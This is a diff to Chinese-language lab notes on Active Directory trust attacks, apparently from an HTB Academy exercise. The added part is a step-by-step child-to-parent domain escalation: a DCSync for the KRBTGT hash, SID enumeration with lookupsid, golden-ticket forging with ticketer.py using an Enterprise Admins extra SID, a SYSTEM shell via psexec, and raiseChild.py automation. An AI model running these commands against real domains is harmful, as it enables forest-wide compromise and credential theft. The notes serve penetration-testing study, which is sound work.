@@ -1,3 +1,6 @@
+SID列表
+https://adsecurity.org/?p=1001
+
 父子 (Parent-child)：同一林中的两个或多个域。子域与父域具有双向可传递信任，子域 corp.inlanefreight.local 中的用户可以验证登录到父域 inlanefreight.local，反之亦然
 跨链接 (Cross-link)：子域之间的信任，用于加速身份验证
 外部 (External)：在两个独立林中、尚未通过林信任连接的两个独立域之间的不可传递信任，这种类型的信任利用 SID 筛选 (SID filtering) 或过滤掉非来自受信任域的身份验证请求（通过 SID）
@@ -71,4 +74,21 @@ mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOC
 子域攻击父域Linux
 
 控制了子域后
-secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt      执行 DCSync 攻击
+secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt      执行 DCSync 攻击，获得子域的 KRBTGT 哈希
+用lookupsid.py 爆破 SID，以找到子域的 SID
+  https://github.com/fortra/impacket/blob/master/examples/lookupsid.py
+lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 
+lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"      加过滤
+lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"            父域中EA组的SID
+用 Impacket 工具包中的 ticketer.py 来构建一个黄金票据
+  https://github.com/fortra/impacket/blob/master/examples/ticketer.py
+ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL
+-domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
+票据将以凭据缓存 (credential cache, ccache) 文件的形式保存到我们的系统中，这是一种用于保存 Kerberos 凭据的文件
+export KRB5CCNAME=hacker.ccache       设置 KRB5CCNAME 环境变量会告知系统在进行 Kerberos 身份验证尝试时使用此文件
+使用 Impacket 的 psexec.py 获取 SYSTEM shell
+psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
+
+Impacket 还有一个工具 raiseChild.py，它可以自动完成从子域到父域的提权过程，需要指定目标域控制器和子域中管理员用户的凭据
+  https://github.com/fortra/impacket/blob/master/examples/raiseChild.py
+raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
